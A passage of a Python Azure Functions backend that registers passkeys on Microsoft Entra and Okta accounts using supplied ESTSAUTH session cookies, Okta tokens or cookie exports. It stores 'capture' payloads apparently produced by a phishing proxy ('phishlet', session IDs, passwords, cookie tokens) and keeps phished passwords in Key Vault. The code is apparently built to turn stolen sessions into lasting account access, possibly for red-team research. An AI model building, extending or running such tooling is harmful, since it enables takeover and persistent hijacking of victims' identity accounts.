from __future__ import annotations

import json
import logging
import os
import base64
import hashlib
import secrets
import subprocess
import sys
import uuid
from datetime import UTC, datetime, timedelta
from pathlib import Path
from urllib.parse import quote

import azure.functions as func
import requests
from azure.identity import ManagedIdentityCredential
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

_resolved_path = Path(__file__).resolve()
_CANONICAL_LIBRARY_ROOT = None
if len(_resolved_path.parents) > 4:
    _CANONICAL_LIBRARY_ROOT = _resolved_path.parents[4] / "python" / "libraries" / "passkey" / "src"
if _CANONICAL_LIBRARY_ROOT and _CANONICAL_LIBRARY_ROOT.exists():
    sys.path.insert(0, str(_CANONICAL_LIBRARY_ROOT))

from passkey import (
    PasskeySecurityError,
    PasskeyValidationError,
    authenticate_with_passkey,
    build_catalog_record,
    build_display_name,
    extract_ests_auth_cookie_value,
    load_config_from_environment,
    normalize_redirect_uri,
    normalize_user_agent,
    login_okta_idx_session,
    login_okta_passkey,
    register_okta_idx_session,
    register_passkey_via_ests_auth,
    register_passkey_via_tap,
    start_myaccount_registration,
)
from passkey.okta import PasskeySecurityError as OktaPasskeySecurityError

app = func.FunctionApp(http_auth_level=func.AuthLevel.FUNCTION)
logger = logging.getLogger("passkey-function")
_COOKIE_EXPORT_FIELDS = ("cookies", "cookieExport", "cookieJson", "cookieData", "browserCookies", "tokens")
_STATUS_CONTAINER_CACHE: set[str] = set()
_CATALOG_TABLE_CACHE: set[str] = set()
_CAPTURE_TABLE_CACHE: set[str] = set()
_CAPTURE_CONTAINER_CACHE: set[str] = set()


def _get_request_body(req: func.HttpRequest) -> dict[str, object]:
    try:
        body = req.get_json()
        if isinstance(body, dict):
            return body
    except ValueError:
        raw_body = req.get_body()
        if raw_body:
            try:
                parsed = json.loads(raw_body.decode("utf-8"))
            except json.JSONDecodeError as exc:
                raise PasskeyValidationError("Request body must be valid JSON.") from exc
            if isinstance(parsed, dict):
                return parsed
    return {}


def _get_request_value(body: dict[str, object], req: func.HttpRequest, *names: str) -> str | None:
    for name in names:
        value = body.get(name)
        if isinstance(value, str) and value.strip():
            return value.strip()
        query_value = req.params.get(name)
        if isinstance(query_value, str) and query_value.strip():
            return query_value.strip()
    return None


def _get_body_value(body: dict[str, object], *names: str) -> object | None:
    for name in names:
        if name in body:
            return body[name]
    return None


def _resolve_user_agent(body: dict[str, object], req: func.HttpRequest) -> str:
    return normalize_user_agent(_get_request_value(body, req, "userAgent", "useragent", "user_agent"))


def _resolve_redirect_uri(body: dict[str, object], req: func.HttpRequest) -> str:
    del body, req
    return normalize_redirect_uri(os.getenv("PASSKEY_ENTRA_PORTAL_ORIGIN", "https://mysignins.microsoft.com"))


def _resolve_okta_domain(body: dict[str, object], req: func.HttpRequest) -> str:
    del body, req
    domain = os.getenv("PASSKEY_OKTA_DOMAIN", "").strip()
    if not domain:
        raise PasskeyValidationError("Missing required server setting 'PASSKEY_OKTA_DOMAIN'.")
    return domain


def _resolve_okta_access_token(body: dict[str, object], req: func.HttpRequest) -> str:
    token = _get_request_value(body, req, "accessToken", "oktaAccessToken")
    if not token:
        authorization = req.headers.get("Authorization", "")
        if authorization.lower().startswith("bearer "):
            token = authorization[7:].strip()
    if not token:
        raise PasskeyValidationError("Missing Okta user access token. Provide 'accessToken' or a Bearer Authorization header.")
    return token


def _json_response(status_code: int, payload: dict[str, object]) -> func.HttpResponse:
    return func.HttpResponse(
        json.dumps(payload, separators=(",", ":")),
        status_code=status_code,
        mimetype="application/json",
    )


def _utc_timestamp() -> str:
    return datetime.now(UTC).isoformat().replace("+00:00", "Z")


def _storage_rfc1123_timestamp() -> str:
    return datetime.now(UTC).strftime("%a, %d %b %Y %H:%M:%S GMT")


def _get_post_registration_login_delay_seconds() -> int:
    raw_value = os.getenv("PASSKEY_POST_REGISTRATION_LOGIN_DELAY_SECONDS", "10").strip()
    try:
        return max(0, int(raw_value))
    except ValueError:
        return 10


def _build_login_propagation_hint() -> dict[str, object]:
    return {
        "delaySeconds": _get_post_registration_login_delay_seconds(),
        "note": (
            "Newly registered passkeys can take a few seconds before login succeeds. "
            "If you automate login immediately after registration, wait briefly and retry once."
        ),
    }


def _get_storage_blob_service_uri() -> str:
    blob_service_uri = os.getenv("AzureWebJobsStorage__blobServiceUri", "").strip().rstrip("/")
    if not blob_service_uri:
        raise PasskeyValidationError("Missing required setting 'AzureWebJobsStorage__blobServiceUri'.")
    return blob_service_uri


def _get_status_container_name() -> str:
    return (os.getenv("PASSKEY_REGISTRATION_STATUS_CONTAINER_NAME", "passkey-registration-status").strip() or
            "passkey-registration-status").lower()


def _get_storage_access_token() -> str:
    configured_token = os.getenv("PASSKEY_STORAGE_ACCESS_TOKEN", "").strip()
    if configured_token:
        return configured_token

    client_id = os.getenv("PASSKEY_MANAGED_IDENTITY_CLIENT_ID") or None
    try:
        credential = ManagedIdentityCredential(client_id=client_id)
        return credential.get_token("https://storage.azure.com/.default").token
    except Exception:  # noqa: BLE001
        pass

    cli_command = [
        "az",
        "account",
        "get-access-token",
        "--resource",
        "https://storage.azure.com/",
        "--query",
        "accessToken",
        "-o",
        "tsv",
    ]
    try:
        result = subprocess.run(cli_command, capture_output=True, text=True, check=True)
        token = result.stdout.strip()
        if token:
            return token
    except Exception:  # noqa: BLE001
        pass

    raise PasskeyValidationError(
        "Unable to acquire a Storage access token. Set PASSKEY_STORAGE_ACCESS_TOKEN, run in Azure with "
        "managed identity, or sign in with Azure CLI."
    )


def _build_storage_headers(access_token: str, **extra_headers: str) -> dict[str, str]:
    headers = {
        "Authorization": f"Bearer {access_token}",
        "x-ms-version": "2023-11-03",
        "x-ms-date": _storage_rfc1123_timestamp(),
    }
    headers.update(extra_headers)
    return headers


def _ensure_status_container_exists() -> None:
    container_name = _get_status_container_name()
    if container_name in _STATUS_CONTAINER_CACHE:
        return

    response = requests.put(
        f"{_get_storage_blob_service_uri()}/{container_name}?restype=container",
        headers=_build_storage_headers(_get_storage_access_token()),
        timeout=30,
    )
    if response.status_code not in (201, 202, 409):
        raise PasskeyValidationError(
            f"Failed to ensure registration status container '{container_name}': "
            f"HTTP {response.status_code}. ResponseBody={response.text[:1000]}"
        )

    _STATUS_CONTAINER_CACHE.add(container_name)


def _build_status_blob_url(request_id: str) -> str:
    return f"{_get_storage_blob_service_uri()}/{_get_status_container_name()}/{quote(f'{request_id}.json', safe='')}"


def _write_registration_status(request_id: str, payload: dict[str, object]) -> None:
    _ensure_status_container_exists()
    payload = dict(payload)
    payload.setdefault("requestId", request_id)
    payload["updatedAtUtc"] = _utc_timestamp()
    payload.setdefault("loginPropagation", _build_login_propagation_hint())
    response = requests.put(
        _build_status_blob_url(request_id),
        headers=_build_storage_headers(
            _get_storage_access_token(),
            **{
                "x-ms-blob-type": "BlockBlob",
                "Content-Type": "application/json; charset=utf-8",
            },
        ),
        data=json.dumps(payload, separators=(",", ":")).encode("utf-8"),
        timeout=30,
    )
    if response.status_code not in (200, 201):
        raise PasskeyValidationError(
            f"Failed to write registration status '{request_id}': "
            f"HTTP {response.status_code}. ResponseBody={response.text[:1000]}"
        )


def _read_registration_status(request_id: str) -> dict[str, object] | None:
    response = requests.get(
        _build_status_blob_url(request_id),
        headers=_build_storage_headers(_get_storage_access_token()),
        timeout=30,
    )
    if response.status_code == 404:
        return None
    if not response.ok:
        raise PasskeyValidationError(
            f"Failed to read registration status '{request_id}': "
            f"HTTP {response.status_code}. ResponseBody={response.text[:1000]}"
        )
    if not response.text:
        return None
    return json.loads(response.text)


def _get_storage_table_service_uri() -> str:
    table_service_uri = os.getenv("AzureWebJobsStorage__tableServiceUri", "").strip().rstrip("/")
    if not table_service_uri:
        raise PasskeyValidationError("Missing required setting 'AzureWebJobsStorage__tableServiceUri'.")
    return table_service_uri


def _get_catalog_table_name() -> str:
    table_name = os.getenv("PASSKEY_CATALOG_TABLE_NAME", "PasskeyCredentials").strip() or "PasskeyCredentials"
    if not table_name.isalnum():
        raise PasskeyValidationError("PASSKEY_CATALOG_TABLE_NAME must contain only letters and numbers.")
    return table_name


def _ensure_catalog_table_exists() -> None:
    table_name = _get_catalog_table_name()
    if table_name in _CATALOG_TABLE_CACHE:
        return
    response = requests.post(
        f"{_get_storage_table_service_uri()}/Tables",
        headers=_build_storage_headers(
            _get_storage_access_token(),
            Accept="application/json;odata=nometadata",
            **{
                "Content-Type": "application/json",
                "DataServiceVersion": "3.0;NetFx",
                "MaxDataServiceVersion": "3.0;NetFx",
            },
        ),
        json={"TableName": table_name},
        timeout=30,
    )
    if response.status_code not in (201, 204, 409):
        raise PasskeyValidationError(
            f"Failed to ensure passkey catalog table '{table_name}': HTTP {response.status_code}. "
            f"ResponseBody={response.text[:1000]}"
        )
    _CATALOG_TABLE_CACHE.add(table_name)


def _save_catalog_record(
    provider: str,
    credential: dict[str, object],
    extensions: dict[str, object] | None = None,
) -> dict[str, object]:
    _ensure_catalog_table_exists()
    record = build_catalog_record(provider, credential)
    if extensions:
        record.update(extensions)
    key_vault = record["keyVault"]
    assert isinstance(key_vault, dict)
    entity = {
        "PartitionKey": str(key_vault["vaultName"]).lower(),
        "RowKey": record["recordId"],
        "SchemaVersion": record["schemaVersion"],
        "Provider": record["provider"],
        "CredentialId": record["credentialId"],
        "RpId": record["rpId"],
        "UserName": record["userName"],
        "DisplayName": record["displayName"],
        "KeyVaultName": key_vault["vaultName"],
        "KeyVaultKeyName": key_vault["keyName"],
        "KeyVaultKeyId": key_vault["keyId"],
        "Status": record["status"],
        "CreatedAt": record["createdAt"],
        "UpdatedAt": record["updatedAt"],
        "SignCount": record["signCount"],
        "RecordJson": json.dumps(record, separators=(",", ":")),
    }
    partition_key = quote(str(entity["PartitionKey"]).replace("'", "''"), safe="")
    row_key = quote(str(entity["RowKey"]).replace("'", "''"), safe="")
    response = requests.put(
        f"{_get_storage_table_service_uri()}/{_get_catalog_table_name()}"
        f"(PartitionKey='{partition_key}',RowKey='{row_key}')",
        headers=_build_storage_headers(
            _get_storage_access_token(),
            Accept="application/json;odata=nometadata",
            **{
                "Content-Type": "application/json",
                "DataServiceVersion": "3.0;NetFx",
                "MaxDataServiceVersion": "3.0;NetFx",
            },
        ),
        json=entity,
        timeout=30,
    )
    if response.status_code not in (200, 201, 204):
        raise PasskeyValidationError(
            f"Failed to save passkey catalog record '{record['recordId']}': HTTP {response.status_code}. "
            f"ResponseBody={response.text[:1000]}"
        )
    return record


def _list_catalog_records(*, provider: str | None = None, rp_id: str | None = None,
                          user_name: str | None = None, status: str | None = None,
                          credential_id: str | None = None, display_name: str | None = None,
                          key_vault_key_name: str | None = None) -> list[dict[str, object]]:
    _ensure_catalog_table_exists()
    vault_name = os.getenv("PASSKEY_KEYVAULT_NAME", "").strip().lower()
    if not vault_name:
        raise PasskeyValidationError("Missing required setting 'PASSKEY_KEYVAULT_NAME'.")
    escaped_vault = vault_name.replace("'", "''")
    records: list[dict[str, object]] = []
    params = {"$filter": f"PartitionKey eq '{escaped_vault}'"}
    while True:
        response = requests.get(
            f"{_get_storage_table_service_uri()}/{_get_catalog_table_name()}()",
            params=params,
            headers=_build_storage_headers(
                _get_storage_access_token(),
                Accept="application/json;odata=nometadata",
                DataServiceVersion="3.0;NetFx",
                MaxDataServiceVersion="3.0;NetFx",
            ),
            timeout=30,
        )
        if not response.ok:
            raise PasskeyValidationError(
                f"Failed to list passkey catalog records: HTTP {response.status_code}. "
                f"ResponseBody={response.text[:1000]}"
            )
        for entity in response.json().get("value", []):
            try:
                record = json.loads(entity["RecordJson"])
            except (KeyError, TypeError, json.JSONDecodeError):
                logging.warning("Skipped malformed passkey catalog entity %s.", entity.get("RowKey", "<unknown>"))
                continue
            if provider and record.get("provider") != provider:
                continue
            if rp_id and str(record.get("rpId") or "").lower() != rp_id.lower():
                continue
            if user_name and str(record.get("userName") or "").lower() != user_name.lower():
                continue
            if status and record.get("status") != status:
                continue
            if credential_id and record.get("credentialId") != credential_id:
                continue
            if display_name and str(record.get("displayName") or "").lower() != display_name.lower():
                continue
            key_vault = record.get("keyVault")
            if key_vault_key_name and (
                not isinstance(key_vault, dict)
                or str(key_vault.get("keyName") or "").lower() != key_vault_key_name.lower()
            ):
                continue
            records.append(record)
        next_partition_key = response.headers.get("x-ms-continuation-NextPartitionKey")
        next_row_key = response.headers.get("x-ms-continuation-NextRowKey")
        if not next_partition_key:
            break
        params["NextPartitionKey"] = next_partition_key
        if next_row_key:
            params["NextRowKey"] = next_row_key
    return records


def _get_catalog_record(record_id: str) -> dict[str, object] | None:
    _ensure_catalog_table_exists()
    vault_name = os.getenv("PASSKEY_KEYVAULT_NAME", "").strip().lower()
    if not vault_name:
        raise PasskeyValidationError("Missing required setting 'PASSKEY_KEYVAULT_NAME'.")
    partition_key = quote(vault_name.replace("'", "''"), safe="")
    row_key = quote(record_id.replace("'", "''"), safe="")
    response = requests.get(
        f"{_get_storage_table_service_uri()}/{_get_catalog_table_name()}"
        f"(PartitionKey='{partition_key}',RowKey='{row_key}')",
        headers=_build_storage_headers(
            _get_storage_access_token(),
            Accept="application/json;odata=nometadata",
            DataServiceVersion="3.0;NetFx",
            MaxDataServiceVersion="3.0;NetFx",
        ),
        timeout=30,
    )
    if response.status_code == 404:
        return None
    if not response.ok:
        raise PasskeyValidationError(
            f"Failed to read passkey catalog record '{record_id}': HTTP {response.status_code}. "
            f"ResponseBody={response.text[:1000]}"
        )
    try:
        return json.loads(response.json()["RecordJson"])
    except (KeyError, TypeError, json.JSONDecodeError) as exc:
        raise PasskeyValidationError(f"Passkey catalog record '{record_id}' is malformed.") from exc


def _get_capture_table_name() -> str:
    name = os.getenv("PASSKEY_CAPTURE_TABLE_NAME", "PasskeyCaptureContexts").strip() or "PasskeyCaptureContexts"
    if not name.isalnum():
        raise PasskeyValidationError("PASSKEY_CAPTURE_TABLE_NAME must contain only letters and numbers.")
    return name


def _get_capture_container_name() -> str:
    return (os.getenv("PASSKEY_CAPTURE_CONTAINER_NAME", "passkey-capture-context").strip() or
            "passkey-capture-context").lower()


def _ensure_capture_resources() -> None:
    table_name = _get_capture_table_name()
    if table_name not in _CAPTURE_TABLE_CACHE:
        response = requests.post(
            f"{_get_storage_table_service_uri()}/Tables",
            headers=_build_storage_headers(
                _get_storage_access_token(),
                Accept="application/json;odata=nometadata",
                **{"Content-Type": "application/json", "DataServiceVersion": "3.0;NetFx", "MaxDataServiceVersion": "3.0;NetFx"},
            ),
            json={"TableName": table_name},
            timeout=30,
        )
        if response.status_code not in (201, 204, 409):
            raise PasskeyValidationError(f"Failed to ensure capture table: HTTP {response.status_code}.")
        _CAPTURE_TABLE_CACHE.add(table_name)

    container_name = _get_capture_container_name()
    if container_name not in _CAPTURE_CONTAINER_CACHE:
        response = requests.put(
            f"{_get_storage_blob_service_uri()}/{container_name}?restype=container",
            headers=_build_storage_headers(_get_storage_access_token()),
            timeout=30,
        )
        if response.status_code not in (201, 202, 409):
            raise PasskeyValidationError(f"Failed to ensure capture container: HTTP {response.status_code}.")
        _CAPTURE_CONTAINER_CACHE.add(container_name)


def _get_key_vault_data_token(config: object) -> str:
    configured = str(getattr(config, "key_vault_access_token", None) or "").strip()
    if configured:
        return configured
    client_id = str(getattr(config, "managed_identity_client_id", None) or "").strip() or None
    try:
        return ManagedIdentityCredential(client_id=client_id).get_token("https://vault.azure.net/.default").token
    except Exception:  # noqa: BLE001
        pass
    try:
        result = subprocess.run(
            ["az", "account", "get-access-token", "--resource", "https://vault.azure.net", "--query", "accessToken", "-o", "tsv"],
            capture_output=True,
            text=True,
            check=True,
        )
        if result.stdout.strip():
            return result.stdout.strip()
    except Exception:  # noqa: BLE001
        pass
    raise PasskeyValidationError("Unable to acquire a Key Vault access token.")


def _key_vault_secret_url(config: object, secret_name: str) -> str:
    vault_name = str(getattr(config, "key_vault_name", "") or "").strip()
    if not vault_name:
        raise PasskeyValidationError("Missing configured Key Vault name.")
    return f"https://{vault_name}.vault.azure.net/secrets/{quote(secret_name, safe='')}?api-version=7.4"


def _set_key_vault_secret(
    config: object,
    secret_name: str,
    value: str,
    *,
    content_type: str,
    expires_at: datetime | None = None,
    tags: dict[str, str] | None = None,
) -> None:
    attributes: dict[str, object] = {"enabled": True}
    if expires_at:
        attributes["exp"] = int(expires_at.timestamp())
    response = requests.put(
        _key_vault_secret_url(config, secret_name),
        headers={"Authorization": f"Bearer {_get_key_vault_data_token(config)}", "Content-Type": "application/json"},
        json={"value": value, "contentType": content_type, "attributes": attributes, "tags": tags or {}},
        timeout=30,
    )
    if response.status_code not in (200, 201):
        raise PasskeyValidationError(f"Failed to store Key Vault secret '{secret_name}': HTTP {response.status_code}.")


def _get_key_vault_secret(config: object, secret_name: str) -> str | None:
    response = requests.get(
        _key_vault_secret_url(config, secret_name),
        headers={"Authorization": f"Bearer {_get_key_vault_data_token(config)}"},
        timeout=30,
    )
    if response.status_code == 404:
        return None
    if not response.ok:
        raise PasskeyValidationError(f"Failed to read Key Vault secret '{secret_name}': HTTP {response.status_code}.")
    value = response.json().get("value")
    return str(value) if value is not None else None


def _delete_key_vault_secret(config: object, secret_name: str) -> bool:
    response = requests.delete(
        _key_vault_secret_url(config, secret_name),
        headers={"Authorization": f"Bearer {_get_key_vault_data_token(config)}"},
        timeout=30,
    )
    if response.status_code == 404:
        return False
    if response.status_code not in (200, 202):
        raise PasskeyValidationError(f"Failed to delete Key Vault secret '{secret_name}': HTTP {response.status_code}.")
    return True


def _capture_id(provider: str, payload: dict[str, object], key_name: str) -> str:
    session_id = str(payload.get("session_id") or payload.get("sessionId") or "").strip()
    if not session_id:
        return str(uuid.uuid4())
    return str(uuid.uuid5(uuid.NAMESPACE_URL, f"passkey-capture:{provider}:{session_id}:{key_name}"))


def _capture_payload_requested(payload: dict[str, object]) -> bool:
    capture_fields = {"event", "phishlet", "session_id", "sessionId", "password", "remote_ip", "cookie_tokens", "body_tokens", "http_tokens", "trigger"}
    return any(name in payload for name in capture_fields)


def _validate_capture_size(payload: dict[str, object]) -> bytes:
    raw = json.dumps(payload, ensure_ascii=False, sort_keys=True, separators=(",", ":")).encode("utf-8")
    try:
        maximum = int(os.getenv("PASSKEY_CAPTURE_MAX_BYTES", "1048576"))
    except ValueError:
        maximum = 1048576
    if len(raw) > maximum:
        raise PasskeyValidationError(f"Capture payload exceeds the configured {maximum}-byte limit.")
    return raw


def _upsert_login_context(
    config: object,
    record_id: str,
    payload: dict[str, object],
    resolved_user_agent: str,
) -> dict[str, object]:
    secret_name = f"pklogin-{record_id}"
    existing: dict[str, object] = {}
    existing_value = _get_key_vault_secret(config, secret_name)
    if existing_value:
        try:
            parsed = json.loads(existing_value)
            if isinstance(parsed, dict):
                existing = parsed
        except json.JSONDecodeError as exc:
            raise PasskeyValidationError(f"Login context secret '{secret_name}' is malformed.") from exc
    password = payload.get("password")
    submitted_user_agent = payload.get("user_agent") or payload.get("userAgent")
    if isinstance(password, str) and password:
        existing["password"] = password
    if isinstance(submitted_user_agent, str) and submitted_user_agent.strip():
        existing["userAgent"] = submitted_user_agent.strip()
    elif resolved_user_agent and not existing.get("userAgent"):
        existing["userAgent"] = resolved_user_agent
    if not existing.get("password") and not existing.get("userAgent"):
        return {"loginContextSecretName": None, "hasStoredPassword": False, "hasStoredUserAgent": False}
    existing["schemaVersion"] = "1"
    existing["updatedAt"] = _utc_timestamp()
    _set_key_vault_secret(
        config,
        secret_name,
        json.dumps(existing, separators=(",", ":")),
        content_type="application/vnd.research-passkeys.login-context+json",
        tags={"recordId": record_id, "kind": "login-context"},
    )
    return {
        "loginContextSecretName": secret_name,
        "hasStoredPassword": bool(existing.get("password")),
        "hasStoredUserAgent": bool(existing.get("userAgent")),
    }


def _save_capture_entity(entity: dict[str, object]) -> None:
    _ensure_capture_resources()
    partition = quote(str(entity["PartitionKey"]).replace("'", "''"), safe="")
    row = quote(str(entity["RowKey"]).replace("'", "''"), safe="")
    response = requests.put(
        f"{_get_storage_table_service_uri()}/{_get_capture_table_name()}(PartitionKey='{partition}',RowKey='{row}')",
        headers=_build_storage_headers(
            _get_storage_access_token(),
            Accept="application/json;odata=nometadata",
            **{"Content-Type": "application/json", "DataServiceVersion": "3.0;NetFx", "MaxDataServiceVersion": "3.0;NetFx"},
        ),
        json=entity,
        timeout=30,
    )
    if response.status_code not in (200, 201, 204):
        raise PasskeyValidationError(f"Failed to save capture metadata: HTTP {response.status_code}.")


def _persist_capture_context(
    provider: str,
    payload: dict[str, object],
    credential: dict[str, object],
    resolved_user_agent: str,
) -> dict[str, object]:
    record = build_catalog_record(provider, credential)
    record_id = str(record["recordId"])
    login_summary = _upsert_login_context(load_config_from_environment(), record_id, payload, resolved_user_agent)
    if not _capture_payload_requested(payload):
        return login_summary
    raw = _validate_capture_size(payload)
    key_name = str((credential.get("keyVault") or {}).get("keyName") or "") if isinstance(credential.get("keyVault"), dict) else ""
    capture_id = _capture_id(provider, payload, key_name)
    expires_at = datetime.now(UTC) + timedelta(hours=24)
    cek = secrets.token_bytes(32)
    nonce = secrets.token_bytes(12)
    aad = f"passkey-capture:v1:{provider}:{capture_id}".encode("utf-8")
    encrypted = AESGCM(cek).encrypt(nonce, raw, aad)
    ciphertext, tag = encrypted[:-16], encrypted[-16:]
    cek_secret_name = f"pkcek-{capture_id}"
    config = load_config_from_environment()
    _set_key_vault_secret(
        config,
        cek_secret_name,
        base64.b64encode(cek).decode("ascii"),
        content_type="application/vnd.research-passkeys.capture-key",
        expires_at=expires_at,
        tags={"recordId": record_id, "captureId": capture_id, "kind": "capture-key"},
    )
    blob_name = f"{record_id}/{capture_id}.json"
    envelope = {
        "schemaVersion": "1",
        "algorithm": "A256GCM",
        "nonce": base64.b64encode(nonce).decode("ascii"),
        "ciphertext": base64.b64encode(ciphertext).decode("ascii"),
        "tag": base64.b64encode(tag).decode("ascii"),
    }
    _ensure_capture_resources()
    response = requests.put(
        f"{_get_storage_blob_service_uri()}/{_get_capture_container_name()}/{quote(blob_name, safe='/')}",
        headers=_build_storage_headers(_get_storage_access_token(), **{"x-ms-blob-type": "BlockBlob", "Content-Type": "application/json"}),
        data=json.dumps(envelope, separators=(",", ":")).encode("utf-8"),
        timeout=30,
    )
    if response.status_code not in (200, 201):
        raise PasskeyValidationError(f"Failed to store encrypted capture: HTTP {response.status_code}.")
    entity = {
        "PartitionKey": record_id,
        "RowKey": capture_id,
        "Provider": provider,
        "Event": str(payload.get("event") or ""),
        "Phishlet": str(payload.get("phishlet") or ""),
        "SessionId": str(payload.get("session_id") or payload.get("sessionId") or ""),
        "Trigger": str(payload.get("trigger") or ""),
        "CapturedAt": str(payload.get("timestamp") or _utc_timestamp()),
        "ReceivedAt": _utc_timestamp(),
        "ExpiresAt": expires_at.isoformat().replace("+00:00", "Z"),
        "Status": "active",
        "PayloadSha256": hashlib.sha256(raw).hexdigest(),
        "EncryptedBlobName": blob_name,
        "CekSecretName": cek_secret_name,
    }
    _save_capture_entity(entity)
    return {**login_summary, "latestCaptureId": capture_id}


def _stage_queued_capture(provider: str, payload: dict[str, object], request_id: str) -> dict[str, object]:
    raw = _validate_capture_size(payload)
    capture_id = str(uuid.uuid5(uuid.NAMESPACE_URL, f"passkey-queue-capture:{provider}:{request_id}"))
    expires_at = datetime.now(UTC) + timedelta(hours=24)
    cek = secrets.token_bytes(32)
    nonce = secrets.token_bytes(12)
    aad = f"passkey-capture:v1:{provider}:{capture_id}".encode("utf-8")
    encrypted = AESGCM(cek).encrypt(nonce, raw, aad)
    cek_secret_name = f"pkcek-{capture_id}"
    config = load_config_from_environment()
    _set_key_vault_secret(config, cek_secret_name, base64.b64encode(cek).decode("ascii"),
                          content_type="application/vnd.research-passkeys.capture-key", expires_at=expires_at,
                          tags={"requestId": request_id, "captureId": capture_id, "kind": "queued-capture-key"})
    blob_name = f"pending/{request_id}/{capture_id}.json"
    envelope = {"schemaVersion": "1", "algorithm": "A256GCM", "nonce": base64.b64encode(nonce).decode("ascii"),
                "ciphertext": base64.b64encode(encrypted[:-16]).decode("ascii"), "tag": base64.b64encode(encrypted[-16:]).decode("ascii")}
    _ensure_capture_resources()
    response = requests.put(
        f"{_get_storage_blob_service_uri()}/{_get_capture_container_name()}/{quote(blob_name, safe='/')}",
        headers=_build_storage_headers(_get_storage_access_token(), **{"x-ms-blob-type": "BlockBlob", "Content-Type": "application/json"}),
        data=json.dumps(envelope, separators=(",", ":")).encode(), timeout=30,
    )
    if response.status_code not in (200, 201):
        raise PasskeyValidationError(f"Failed to stage encrypted queue capture: HTTP {response.status_code}.")
    return {"provider": provider, "captureId": capture_id, "expiresAt": expires_at.isoformat().replace("+00:00", "Z"),
            "encryptedBlobName": blob_name, "cekSecretName": cek_secret_name}


def _list_capture_contexts(record_id: str) -> list[dict[str, object]]:
    _ensure_capture_resources()
    escaped = record_id.replace("'", "''")
    response = requests.get(
        f"{_get_storage_table_service_uri()}/{_get_capture_table_name()}()",
        params={"$filter": f"PartitionKey eq '{escaped}'"},
        headers=_build_storage_headers(_get_storage_access_token(), Accept="application/json;odata=nometadata", DataServiceVersion="3.0;NetFx", MaxDataServiceVersion="3.0;NetFx"),
        timeout=30,
    )
    if not response.ok:
        raise PasskeyValidationError(f"Failed to list capture contexts: HTTP {response.status_code}.")
    contexts = [{
        "recordId": item.get("PartitionKey"), "captureId": item.get("RowKey"), "provider": item.get("Provider"),
        "event": item.get("Event"), "phishlet": item.get("Phishlet"), "sessionId": item.get("SessionId"),
        "trigger": item.get("Trigger"), "capturedAt": item.get("CapturedAt"), "receivedAt": item.get("ReceivedAt"),
        "expiresAt": item.get("ExpiresAt"), "status": item.get("Status"), "payloadSha256": item.get("PayloadSha256"),
        "encryptedBlobName": item.get("EncryptedBlobName"), "cekSecretName": item.get("CekSecretName"),
    } for item in response.json().get("value", [])]
    for context in contexts:
        try:
            if datetime.now(UTC) >= datetime.fromisoformat(str(context["expiresAt"]).replace("Z", "+00:00")):
                context["status"] = "expired"
        except (KeyError, ValueError):
            pass
    return contexts


def _get_capture_context(record_id: str, capture_id: str) -> dict[str, object] | None:
    return next((item for item in _list_capture_contexts(record_id) if item.get("captureId") == capture_id), None)


def _development_export_enabled() -> bool:
    return os.getenv("PASSKEY_DEPLOYMENT_PROFILE", "development") == "development" and os.getenv("PASSKEY_ENABLE_DEV_SECRET_EXPORT", "false").lower() == "true"


def _load_login_context(record: dict[str, object]) -> dict[str, object]:
    secret_name = str(record.get("loginContextSecretName") or "")
    if not secret_name:
        return {}
    value = _get_key_vault_secret(load_config_from_environment(), secret_name)
    if not value:
        return {}
    parsed = json.loads(value)
    if not isinstance(parsed, dict):
        raise PasskeyValidationError("Stored login context is malformed.")
    return parsed


def _decrypt_capture(context: dict[str, object]) -> dict[str, object]:
    expires_at = datetime.fromisoformat(str(context["expiresAt"]).replace("Z", "+00:00"))
    if datetime.now(UTC) >= expires_at:
        raise TimeoutError("Capture context has expired.")
    cek_value = _get_key_vault_secret(load_config_from_environment(), str(context["cekSecretName"]))
    if not cek_value:
        raise PasskeyValidationError("Capture encryption key was not found.")
    response = requests.get(
        f"{_get_storage_blob_service_uri()}/{_get_capture_container_name()}/{quote(str(context['encryptedBlobName']), safe='/')}",
        headers=_build_storage_headers(_get_storage_access_token()),
        timeout=30,
    )
    if not response.ok:
        raise PasskeyValidationError(f"Encrypted capture was not found: HTTP {response.status_code}.")
    envelope = response.json()
    aad = f"passkey-capture:v1:{context['provider']}:{context['captureId']}".encode("utf-8")
    plaintext = AESGCM(base64.b64decode(cek_value)).decrypt(
        base64.b64decode(envelope["nonce"]),
        base64.b64decode(envelope["ciphertext"]) + base64.b64decode(envelope["tag"]),
        aad,
    )
    parsed = json.loads(plaintext)
    if not isinstance(parsed, dict):
        raise PasskeyValidationError("Decrypted capture is malformed.")
    return parsed


def _cleanup_capture_provenance() -> int:
    _ensure_capture_resources()
    try:
        days = max(1, int(os.getenv("PASSKEY_CAPTURE_PROVENANCE_DAYS", "90")))
    except ValueError:
        days = 90
    cutoff = datetime.now(UTC) - timedelta(days=days)
    response = requests.get(
        f"{_get_storage_table_service_uri()}/{_get_capture_table_name()}()",
        headers=_build_storage_headers(_get_storage_access_token(), Accept="application/json;odata=nometadata", DataServiceVersion="3.0;NetFx", MaxDataServiceVersion="3.0;NetFx"),
        timeout=30,
    )
    if not response.ok:
        raise PasskeyValidationError(f"Failed to enumerate capture provenance: HTTP {response.status_code}.")
    deleted = 0
    for entity in response.json().get("value", []):
        try:
            received = datetime.fromisoformat(str(entity.get("ReceivedAt") or "").replace("Z", "+00:00"))
        except ValueError:
            continue
        if received >= cutoff:
            continue
        partition = quote(str(entity["PartitionKey"]).replace("'", "''"), safe="")
        row = quote(str(entity["RowKey"]).replace("'", "''"), safe="")
        delete = requests.delete(
            f"{_get_storage_table_service_uri()}/{_get_capture_table_name()}(PartitionKey='{partition}',RowKey='{row}')",
            headers=_build_storage_headers(_get_storage_access_token(), **{"If-Match": "*"}),
            timeout=30,
        )
        if delete.status_code in (204, 404):
            deleted += 1
    return deleted


def _build_status_url(req: func.HttpRequest, request_id: str, provider: str = "entra") -> str:
    base_url = req.url.split("?", 1)[0].rstrip("/")
    queue_suffixes = (
        f"/api/{provider}/passkeys/register/estsauth/queue",
        f"/api/{provider}/passkeys/register/idx/queue",
    )
    queue_suffix = next((suffix for suffix in queue_suffixes if base_url.endswith(suffix)), None)
    if queue_suffix:
        status_url = f"{base_url[: -len(queue_suffix)]}/api/{provider}/passkeys/register/status/{request_id}"
    else:
        status_url = f"/api/{provider}/passkeys/register/status/{request_id}"
    code = req.params.get("code")
    if code:
        separator = "&" if "?" in status_url else "?"
        status_url = f"{status_url}{separator}code={quote(code, safe='')}"
    return status_url


def _resolve_ests_auth_value(body: dict[str, object], req: func.HttpRequest) -> str | None:
